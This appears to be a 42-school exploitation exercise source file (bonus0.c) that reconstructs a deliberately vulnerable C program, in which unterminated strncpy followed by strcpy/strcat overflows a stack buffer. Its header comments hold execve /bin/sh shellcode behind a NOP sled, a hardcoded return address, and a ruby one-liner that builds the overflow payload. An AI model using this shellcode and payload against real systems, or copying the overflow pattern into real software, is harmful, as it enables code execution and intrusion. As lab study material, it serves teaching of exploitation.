/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   bonus0.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/20 19:48:33 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/22 13:59:28 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <unistd.h>
#include <string.h>

//export EXPLOIT=$(ruby -e 'print "\x90" * 128 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"')
//EXPLOIT ~@ 0xbffff86a -> middle @ 0xbffff86a + 64 = bffff8aa
//ruby -e 'print "x" * 4095 + "\n" + "x" * 14 + "\xaa\xf8\xff\xbf" + "x\n"' > /tmp/exploit

void	p(char *s1, char *s2) {
	char	buff[4096];

	puts(s2);
	read(0, buff, 4096);
	*strchr(buff, '\n') = '\0';	
	strncpy(s1, buff, 20);
}

void	pp(char *str) {
	char	s1[20];
	char	s2[20];

	p(s2, " - ");
	p(s1, " - ");
	strcpy(str, s2);
	str[strlen(str)] = ' ';
	strcat(str, s1);
}

int		main(void) {
	char	str[42];

	pp(str);
	puts(str);
	
	return (0);
}
